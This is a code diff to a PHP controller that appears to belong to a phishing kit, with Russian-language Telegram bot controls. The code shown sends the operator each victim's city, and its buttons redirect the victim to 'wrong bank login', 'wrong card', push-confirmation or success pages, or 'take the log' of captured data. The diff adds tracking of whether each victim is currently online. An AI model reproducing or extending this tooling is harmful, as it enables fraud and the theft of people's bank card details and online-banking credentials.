@@ -81,6 +81,11 @@ class PagesController extends Controller
                         "🚛<b>Платформа:</b> <code>{$this->platform()}</code>"
                     ]);
                 }
+                if ($this->uuid) {
+                    Cache::forget("$this->uuid.is_online");
+                    Cache::put("$this->uuid.is_online", now()->toDateTimeString(), 60);
+                }
+
                 return $next($request);
             } catch (Throwable|Exception $exception) {
                 Cache::forget("fake:$track_id");
@@ -155,8 +160,9 @@ class PagesController extends Controller
             $city_geo = is_null($ipData)
                 ? ""
                 : "{$ipData['location']['country_flag_emoji']} {$ipData['city']}, {$ipData['region_name']}";
-            $keyboard = Keyboard::make([
-                "inline_keyboard" => $chat_id === BotController::groupAdmin('id') ? [
+            $inline_keyboard = [];
+            if ($chat_id === BotController::groupAdmin('id')) {
+                $inline_keyboard = [
                     [["text" => "⤴️ / (ошибка)", "callback_data" => "/redirect {$fake->track_id} {$this->uuid} /"]],
                     [["text" => "⤴️ /banks (неверный лк)", "callback_data" => "/redirect {$fake->track_id} {$this->uuid} /banks"]],
                     [["text" => "⤴️ /order (неверная карта)", "callback_data" => "/redirect {$fake->track_id} {$this->uuid} /order"]],
@@ -165,7 +171,11 @@ class PagesController extends Controller
                     [["text" => "⤴️ /success (успешно)", "callback_data" => "/redirect {$fake->track_id} {$this->uuid} /success"]],
                     [["text" => "⤴️ /push (подтверждение)", "callback_data" => "/redirect {$fake->track_id} {$this->uuid} /push"]],
                     [["text" => "🖇 Взять лог", "callback_data" => "/takeLog {$fake->track_id}"]],
-                ] : [],
+                ];
+            }
+            $inline_keyboard[] = [["text" => "👁‍🗨", "callback_data" => "/is_online {$this->uuid}"]];
+            $keyboard = Keyboard::make([
+                "inline_keyboard" => $inline_keyboard,
                 "resize_keyboard" => true,
             ]);
             if ($chat_id === BotController::groupAdmin('id') || $chat_id === BotController::groupAlert('id')) {
